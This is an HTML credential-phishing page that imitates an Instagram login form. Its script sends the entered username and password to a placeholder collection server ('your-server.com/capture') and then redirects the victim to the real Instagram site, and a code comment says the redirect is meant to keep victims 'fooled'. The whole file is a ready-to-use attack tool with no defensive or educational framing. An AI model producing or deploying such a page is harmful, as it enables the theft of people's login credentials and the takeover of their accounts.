<!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
    <style>
        body { background: #fafafa; font-family: Arial, sans-serif; }
        .login-box { width: 300px; margin: 100px auto; padding: 20px; background: #fff; border: 1px solid #ccc; }
        input { width: 100%; padding: 10px; margin: 10px 0; }
        button { width: 100%; padding: 10px; background: #4CAF50; color: white; border: none; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Instagram</h2>
        <form action="https://your-server.com/capture" method="POST">
            <input type="text" placeholder="Username" name="username" required>
            <input type="password" placeholder="Password" name="password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
    <script>
        // Redirect to real Instagram to keep 'em fooled
        document.querySelector('form').onsubmit = function(e) {
            e.preventDefault();
            const username = document.querySelector('input[name="username"]').value;
            const password = document.querySelector('input[name="password"]').value;
            fetch('https://your-server.com/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
            });
            window.location = 'https://www.instagram.com/';
        };
    </script>
</body>
</html>
